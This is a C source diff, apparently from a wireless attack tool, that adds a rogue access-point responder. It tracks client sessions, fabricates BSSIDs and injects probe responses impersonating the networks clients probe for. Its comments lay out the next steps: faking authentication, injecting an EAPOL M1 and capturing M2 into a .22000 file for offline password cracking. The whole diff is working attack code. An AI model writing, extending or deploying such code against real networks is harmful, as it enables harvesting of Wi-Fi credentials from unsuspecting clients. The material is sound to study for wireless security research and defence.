@@ -41,19 +41,19 @@ struct rogue {
 	time_t           last;
 };
 
+#define APLESS_RESP_COOLDOWN  1   /* min seconds between rogue proberesps per session */
+
 struct apless {
-	struct inject    *inject;
 	struct handshake *hs;
 	struct rogue      sessions[APLESS_MAX_SESSIONS];
 	uint32_t          nic;              /* increments to fabricate distinct BSSIDs */
 };
 
-struct apless *apless_create(struct inject *inject, struct handshake *hs)
+struct apless *apless_create(struct handshake *hs)
 {
 	struct apless *a = calloc(1, sizeof *a);
 	if (!a) return NULL;
-	a->inject = inject;
-	a->hs     = hs;
+	a->hs = hs;
 	log_info("apless: rogue-AP M2 responder armed (opt-in attack)");
 	return a;
 }
@@ -63,14 +63,59 @@ void apless_destroy(struct apless *a)
 	free(a);
 }
 
-void apless_on_frame(struct apless *a, const struct dot11_info *d,
+/* Find the session for this (client, ESSID), or claim a free slot and
+ * fabricate a locally-administered rogue BSSID for it. NULL if the table is
+ * full. */
+static struct rogue *session_get(struct apless *a, const uint8_t client[6],
+                                 const char *essid, uint8_t essid_len, time_t now)
+{
+	struct rogue *freeslot = NULL;
+	for (int i = 0; i < APLESS_MAX_SESSIONS; i++) {
+		struct rogue *r = &a->sessions[i];
+		if (!r->in_use) { if (!freeslot) freeslot = r; continue; }
+		if (memcmp(r->client, client, 6) == 0 &&
+		    r->essid_len == essid_len &&
+		    memcmp(r->essid, essid, essid_len) == 0)
+			return r;
+	}
+	if (!freeslot) return NULL;
+	memset(freeslot, 0, sizeof *freeslot);
+	freeslot->in_use   = 1;
+	memcpy(freeslot->client, client, 6);
+	freeslot->essid_len = essid_len;
+	memcpy(freeslot->essid, essid, essid_len);
+	freeslot->essid[essid_len] = '\0';
+	/* fabricated BSSID: locally-administered OUI + incrementing NIC */
+	freeslot->bssid[0] = 0x02; freeslot->bssid[1] = 0x11; freeslot->bssid[2] = 0x22;
+	freeslot->bssid[3] = (a->nic >> 16) & 0xff;
+	freeslot->bssid[4] = (a->nic >> 8)  & 0xff;
+	freeslot->bssid[5] =  a->nic        & 0xff;
+	a->nic++;
+	freeslot->state   = ROGUE_PROBED;
+	freeslot->created = now;
+	return freeslot;
+}
+
+void apless_on_frame(struct apless *a, struct inject *inject,
+                     const struct dot11_info *d,
                      const uint8_t *raw, size_t raw_len, int channel)
 {
-	(void)a; (void)d; (void)raw; (void)raw_len; (void)channel;
-	/* TODO (next increment): directed probe-req -> rogue proberesp (impersonate
-	 * the probed ESSID); auth/assoc-req -> auth/assoc responses + inject our
-	 * EAPOL M1 with a fresh ANONCE; EAPOL M2 -> register our M1 with the
-	 * handshake collector and finalise the .22000. */
+	(void)raw; (void)raw_len;
+	if (!a || !inject || !d) return;
+
+	if (d->kind == DOT11_FRAME_PROBE_REQ) {
+		/* Directed probes only — ignore wildcard/broadcast (phase 2). */
+		if (!d->has_ssid || d->ssid_len == 0) return;
+		time_t now = time(NULL);
+		struct rogue *r = session_get(a, d->sa, d->ssid, d->ssid_len, now);
+		if (!r) return;
+		if (r->last && now - r->last < APLESS_RESP_COOLDOWN) return;
+		r->last = now;
+		/* Impersonate the ESSID the client is looking for. The auth/assoc +
+		 * M1/M2 steps land in the next increments. */
+		inject_probe_response(inject, r->bssid, r->client,
+		                      r->essid, r->essid_len, channel);
+	}
 }
 
 void apless_tick(struct apless *a, time_t now)
